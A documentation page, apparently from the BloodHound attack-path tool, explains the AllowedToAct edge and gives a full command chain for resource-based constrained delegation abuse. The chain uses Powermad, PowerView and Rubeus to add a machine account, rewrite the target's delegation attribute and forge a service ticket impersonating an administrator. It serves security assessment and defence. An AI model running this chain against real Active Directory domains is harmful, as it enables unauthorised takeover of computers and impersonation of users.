@@ -1,0 +1,65 @@
+---
+title: AllowedToAct
+---
+
+<Frame>
+  <img src="/hc/images/image-2-1.png"/>
+</Frame>
+
+This edge allows an attacker to abuse resource-based constrained delegation to compromise the target. This property is a binary DACL that controls what security principals can pretend to be any domain user to the particular computer object.
+
+An attacker can execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket “as” this user.
+
+One caveat is that impersonated users can not be in the “Protected Users” security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL _must_ have a service principal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.
+
+**Abuse Info**
+
+Abusing this primitive is currently possible through the Rubeus project.
+
+First, if an attacker does not control an account with an SPN set, Kevin Robertson’s Powermad project can be used to add a new attacker-controlled computer account:
+```bash
+New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
+```
+
+PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
+
+```bash
+$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
+```
+We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:
+
+```bash
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+```
+Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we’re taking over, again using PowerView in this case:
+
+```bash
+Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+```
+We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
+```bash
+Rubeus.exe hash /password:Summer2018!
+```
+And finally we can use Rubeus’ _s4u_ module to get a service ticket for the service name (sname) we want to “pretend” to be “admin” for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
+
+```bash
+Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt
+```
+See a video walk through of how to execute this attack here:
+
+<iframe id="youtube-453" frameborder="0" allowfullscreen="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" title="Player for BloodHound 2.1's New Computer Takeover Attack" width="100%" height="420" src="https://www.youtube.com/embed/RUbADHcBLKg?autoplay=0&amp;controls=0&amp;disablekb=1&amp;playsinline=1&amp;cc_load_policy=0&amp;cc_lang_pref=auto&amp;widget_referrer=https%3A%2F%2Fsupport.bloodhoundenterprise.io%2Fhc%2Fen-us%2Farticles%2FAllowedToAct&amp;rel=0&amp;showinfo=0&amp;iv_load_policy=3&amp;modestbranding=1&amp;customControls=true&amp;noCookie=false&amp;enablejsapi=1&amp;origin=https%3A%2F%2Fsupport.bloodhoundenterprise.io&amp;widgetid=1" data-gtm-yt-inspected-6="true"></iframe>
+
+## Opsec Considerations
+
+To execute this attack, the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain.
+
+## References
+
+* [https://eladshamir.com/2019/01/28/Wagging-the-Dog.html](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
+* [https://github.com/GhostPack/Rubeus#s4u](https://github.com/GhostPack/Rubeus#s4u)
+* [https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff](https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff)
+* [https://blog.harmj0y.net/redteaming/another-word-on-delegation/](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
+* [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
+* [https://github.com/Kevin-Robertson/Powermad#new-machineaccount](https://github.com/Kevin-Robertson/Powermad#new-machineaccount)
